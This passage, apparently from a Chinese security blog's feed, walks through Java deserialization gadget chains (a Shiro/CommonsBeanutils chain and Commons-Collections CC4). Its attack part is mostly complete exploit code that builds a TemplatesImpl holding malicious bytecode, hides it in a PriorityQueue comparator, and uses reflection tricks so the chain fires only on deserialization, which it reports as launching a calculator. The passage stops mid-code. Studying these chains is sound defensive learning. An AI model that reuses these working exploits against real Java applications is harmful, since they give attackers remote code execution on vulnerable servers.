iae.toString());<br>            &#125; <span class="hljs-keyword">catch</span> (InvocationTargetException ite) &#123;<br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(<span class="hljs-string">&quot;InvocationTargetException: &quot;</span> + ite.toString());<br>            &#125; <span class="hljs-keyword">catch</span> (NoSuchMethodException nsme) &#123;<br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(<span class="hljs-string">&quot;NoSuchMethodException: &quot;</span> + nsme.toString());<br>            &#125;<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure><p>在CC4这条链中是调用过类似的compare方法的</p><p>我们把加载Compare方法的类替换掉，这条链子大概就是这样的</p><p><img src="/img/shiro/s16.png"></p><p>知道整条链后就可以编写EXP了</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.exanple;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> org.apache.commons.beanutils.BeanComparator;<br><span class="hljs-keyword">import</span> org.apache.commons.beanutils.PropertyUtils;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.comparators.TransformingComparator;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InstantiateTransformer;<br><br><span class="hljs-keyword">import</span> javax.xml.transform.Templates;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.nio.file.Files;<br><span class="hljs-keyword">import</span> java.nio.file.Paths;<br><span class="hljs-keyword">import</span> java.util.PriorityQueue;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">EXP</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">templatesClass</span> <span class="hljs-operator">=</span> templates.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">nameField</span> <span class="hljs-operator">=</span> templatesClass.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>        nameField.setAccessible(<span class="hljs-literal">true</span>);<br>        nameField.set(templates,<span class="hljs-string">&quot;enableTemplatesImplDeserialization&quot;</span>);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">bytecodesField</span> <span class="hljs-operator">=</span> templatesClass.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>        bytecodesField.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">byte</span>[] evil = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;D://Test.class&quot;</span>));<br>        <span class="hljs-type">byte</span>[][] codes = &#123;evil&#125;;<br>        bytecodesField.set(templates,codes);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">tfactoryField</span> <span class="hljs-operator">=</span> templatesClass.getDeclaredField(<span class="hljs-string">&quot;_tfactory&quot;</span>);<br>        tfactoryField.setAccessible(<span class="hljs-literal">true</span>);<br>        tfactoryField.set(templates, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br><br>        <span class="hljs-type">BeanComparator</span> <span class="hljs-variable">beanComparator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BeanComparator</span>(<span class="hljs-string">&quot;outputProperties&quot;</span>);<br>        <span class="hljs-type">TransformingComparator</span> <span class="hljs-variable">transformingComparator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformingComparator</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-number">1</span>));<br><br>        <span class="hljs-type">PriorityQueue</span> <span class="hljs-variable">priorityQueue</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>&lt;&gt;(transformingComparator);<br><br>        priorityQueue.add(templates);<br>        priorityQueue.add(templates);<br><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> priorityQueue.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">transformer</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;comparator&quot;</span>);<br>        transformer.setAccessible(<span class="hljs-literal">true</span>);<br>        transformer.set(priorityQueue,beanComparator);<br><br><br>        <span class="hljs-comment">// 触发序列化 + 反序列化</span><br>        serialize(priorityQueue);<br>        unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        oos.writeObject(obj);<br>        oos.close();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String Filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(Filename));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();<br>        ois.close();<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>成功弹出计算器</p><p><img src="/img/shiro/s17.png"></p><p>注意：这里如果想要最后通过反射修改属性达到反序列化时才触发链子的目的，是不能更改</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">BeanComparator</span> <span class="hljs-variable">outputProperties</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BeanComparator</span>(<span class="hljs-string">&quot;outputProperties&quot;</span>);<br></code></pre></td></tr></table></figure><p>这个的属性值的</p><p>这里要求比较严苛，要求传入的东西必须有<code>TemplatesImpl</code> 里&#96; 的 getter，不然会报错</p><p>但是实际上TemplatesImpl里有的getter方法只有getOutputProperties()是Propertiespublic 型</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">synchronized</span> Properties <span class="hljs-title function_">getOutputProperties</span><span class="hljs-params">()</span>;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">synchronized</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getTransletIndex</span><span class="hljs-params">()</span>;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">synchronized</span> <span class="hljs-type">byte</span>[][] getBytecodes();<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">synchronized</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span>;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">synchronized</span> TransformerFactory <span class="hljs-title function_">getTransformerFactory</span><span class="hljs-params">()</span>;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">synchronized</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getTransletCount</span><span class="hljs-params">()</span>;<br></code></pre></td></tr></table></figure><p>所以我们这里选择构造一个无用的comparator传入 priorityQueue中，再用反射修改回来</p>]]></content>
    
    
    <categories>
      
      <category>Java安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Java安全</tag>
      
      <tag>shiro</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Java安全-CC4&amp;CC2&amp;CC5&amp;CC7链</title>
    <link href="/2025/09/15/Java%E5%AE%89%E5%85%A8-CC4&amp;CC2&amp;CC5&amp;CC7%E9%93%BE/"/>
    <url>/2025/09/15/Java%E5%AE%89%E5%85%A8-CC4&amp;CC2&amp;CC5&amp;CC7%E9%93%BE/</url>
    
    <content type="html"><![CDATA[<h1 id="Java安全-CC4链"><a href="#Java安全-CC4链" class="headerlink" title="Java安全-CC4链"></a>Java安全-CC4链</h1><h1 id="CC4链"><a href="#CC4链" class="headerlink" title="CC4链"></a>CC4链</h1><p>因为 CommonsCollections4 除 4.0 的其他版本去掉了 InvokerTransformer 的 Serializable 继承，导致无法序列化。</p><h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p>先说一下 jdk 这个环境，理论上只有 CC1 和 CC3 链受到 jdk 版本影响。</p><ul><li><p>JDK8u65</p></li><li><p>[openJDK 8u65</p></li><li><p>Maven 4.0.0</p></li><li><p>Commons-Collections 4.0</p></li></ul><p>Maven 下载 Commons-Collections 依赖。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;dependency&gt;  <br> &lt;groupId&gt;org.apache.commons&lt;/groupId&gt;  <br> &lt;artifactId&gt;commons-collections4&lt;/artifactId&gt;  <br> &lt;version&gt;<span class="hljs-number">4.0</span>&lt;/version&gt;  <br>&lt;/dependency&gt;<br></code></pre></td></tr></table></figure><h2 id="CC4-链分析"><a href="#CC4-链分析" class="headerlink" title="CC4 链分析"></a>CC4 链分析</h2><blockquote><p>因为还是 CC 链的漏洞，所以一般是与 <code>transform</code> 分不开的。</p></blockquote><ul><li>从尾部向首部分析，尾部命令执行的方式就两种，反射或是动态加载字节码。因为 CC4 链上只是去掉了 InvokerTransformer 的 Serializable 继承，所以最后的命令执行不受影响。</li></ul><p>这里的 InvokerTransformer 用不了了，我们去找谁调用了 <code>transform()</code> 方法</p><p>找到TransformingComparator的compare方法</p><p><img src="/img/CC4/c01.png"></p><p>compare方法查找用法时是有133个结果的，很难排查</p><p>所以我们这里继续寻找方法调用的时候需要一些编程基础的</p><p>这里直接看到PriorityQueue的readObject方法</p><p>调用了heapify方法</p><p><img src="/img/CC4/c02.png"></p><p>heapify方法调用了siftDown方法(这里不贴出)</p><p>继续走到siftDown方法方法</p><p><img src="/img/CC4/c04.png"></p><p>走进if循环发现siftDownUsingComparator方法有compare方法的调用</p><p><img src="/img/CC4/c05.png"></p><h2 id="EXP编写"><a href="#EXP编写" class="headerlink" title="EXP编写"></a>EXP编写</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.InstantiateTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;<br><br><span class="hljs-keyword">import</span> javax.xml.transform.Templates;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.nio.file.Files;<br><span class="hljs-keyword">import</span> java.nio.file.Paths;<br><span class="hljs-keyword">import</span> java.util.PriorityQueue;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC4EXP</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IllegalAccessException, NoSuchFieldException, IOException, ClassNotFoundException &#123;<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">templatesClass</span> <span class="hljs-operator">=</span> templates.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">nameField</span> <span class="hljs-operator">=</span> templatesClass.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>        nameField.setAccessible(<span class="hljs-literal">true</span>);<br>        nameField.set(templates, <span class="hljs-string">&quot;enableTemplatesImplDeserialization&quot;</span>);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">bytecodesField</span> <span class="hljs-operator">=</span> templatesClass.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>        bytecodesField.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">byte</span>[] evil = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;D://Test.class&quot;</span>));<br>        <span class="hljs-type">byte</span>[][] codes = &#123;evil&#125;;<br>        bytecodesField.set(templates, codes);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">tfactoryField</span> <span class="hljs-operator">=</span> templatesClass.getDeclaredField(<span class="hljs-string">&quot;_tfactory&quot;</span>);<br>        tfactoryField.setAccessible(<span class="hljs-literal">true</span>);<br>        tfactoryField.set(templates, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br>        <span class="hljs-comment">//templates.newTransformer();</span><br><br>        <span class="hljs-type">InstantiateTransformer</span> <span class="hljs-variable">instantiateTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InstantiateTransformer</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Templates.class&#125;,<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;templates&#125;);<br>        <span class="hljs-comment">//instantiateTransformer.transform(TrAXFilter.class);</span><br><br><br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-comment">//触发攻击链子</span><br>                <span class="hljs-comment">//其实这里可以不用这个，因为我们不再需要进入setValue方法</span><br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(TrAXFilter.class),<br>                instantiateTransformer<br>        &#125;;<br><br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br><br>        <span class="hljs-type">TransformingComparator</span> <span class="hljs-variable">transformingComparator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformingComparator</span>(chainedTransformer);<br><br>        <span class="hljs-type">PriorityQueue</span> <span class="hljs-variable">priorityQueue</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>&lt;&gt;(transformingComparator);<br><br>        <span class="hljs-comment">// 触发序列化 + 反序列化</span><br>        serialize(priorityQueue);<br>        unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        oos.writeObject(obj);<br>        oos.close();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String Filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(Filename));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();<br>        ois.close();<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>运行这个程序，发现没有弹出计算器也没有报错</p><p>在readObject下一个断点调试一下</p><p>断在795行，调用heapify方法时下一个断点</p><p>看到这里发现size&#x3D;0是无法进入siftDown方法的</p><p><img src="/img/CC4/c06.png"></p><p>在readObject方法中有关于size的代码</p><p><img src="/img/CC4/c07.png"></p><p>修改EXP</p><p>要修改 Size，必然要先明白 Size 是什么，Size 就是 PriorityQueue 这个队列的长度，简单理解，就是数组的长度。现在我们这个数组的长度为 0，0 - 1 &#x3D; -1，所以会直接跳出循环，不能弹计算器。</p><p>通过此语句加上即可</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">priorityQueue.add(<span class="hljs-number">1</span>);  <br>priorityQueue.add(<span class="hljs-number">2</span>);<br></code></pre></td></tr></table></figure><p>运行一下是能弹计算器的，但是报错了</p><p>原因是：</p><p>在我们进行 <code>priorityQueue.add(1)</code> 这个语句的时候，它内部会自动进行 <code>compare()</code> 方法的执行，然后调用 <code>transform()</code>，触发我们的chainedTransformer组合链。还没有序列化与反序列化，就弹出计算器了</p><p>但是在这里由于 <code>_tfactory</code> 为 null，导致报错。</p><p>还记得我们在 CC3 链里面讲的那个 <code>_tfactory</code> 的值吗？</p><p>当时我们是写的这段 EXP</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Field</span> <span class="hljs-variable">tfactoryField</span> <span class="hljs-operator">=</span> templatesClass.getDeclaredField(<span class="hljs-string">&quot;_tfactory&quot;</span>);  <br>tfactoryField.setAccessible(<span class="hljs-literal">true</span>);  <br>tfactoryField.set(templates, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());  <br>templates.newTransformer();<br></code></pre></td></tr></table></figure><ul><li>我在跑代码的时候把最后一行给注释掉了，所以才会出错。<code>_tfactory</code> 是在反序列化的时候才会加进来的，所以加上就不报错了。不过删掉也无所谓，因为我们本来就不想让其本地执行。</li></ul><p>同样的，想要解决这个报错，我们只需要给链子其中一个方法传入一个没用的对象，再用反射修改，就可以了</p><p>这里将这行代码做更改</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">TransformingComparator</span> <span class="hljs-variable">transformingComparator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformingComparator</span>(chainedTransformer);<br></code></pre></td></tr></table></figure><p>先传入一个没有用的对象</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">TransformingComparator</span> <span class="hljs-variable">transformingComparator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformingComparator</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-number">1</span>));<br></code></pre></td></tr></table></figure><p>再反射修改</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> transformingComparator.getClass();<br><span class="hljs-type">Field</span> <span class="hljs-variable">transformer</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;transformer&quot;</span>);<br>transformer.setAccessible(<span class="hljs-literal">true</span>);<br>transformer.set(transformingComparator, chainedTransformer);<br></code></pre></td></tr></table></figure><p>最终EXP</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.InstantiateTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;<br><br><span class="hljs-keyword">import</span> javax.xml.transform.Templates;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.nio.file.Files;<br><span class="hljs-keyword">import</span> java.nio.file.Paths;<br><span class="hljs-keyword">import</span> java.util.Comparator;<br><span class="hljs-keyword">import</span> java.util.PriorityQueue;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC4EXP</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IllegalAccessException, NoSuchFieldException, IOException, ClassNotFoundException &#123;<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">templatesClass</span> <span class="hljs-operator">=</span> templates.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">nameField</span> <span class="hljs-operator">=</span> templatesClass.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>        nameField.setAccessible(<span class="hljs-literal">true</span>);<br>        nameField.set(templates, <span class="hljs-string">&quot;enableTemplatesImplDeserialization&quot;</span>);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">bytecodesField</span> <span class="hljs-operator">=</span> templatesClass.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>        bytecodesField.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">byte</span>[] evil = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;D://Test.class&quot;</span>));<br>        <span class="hljs-type">byte</span>[][] codes = &#123;evil&#125;;<br>        bytecodesField.set(templates, codes);<br><br>        <span 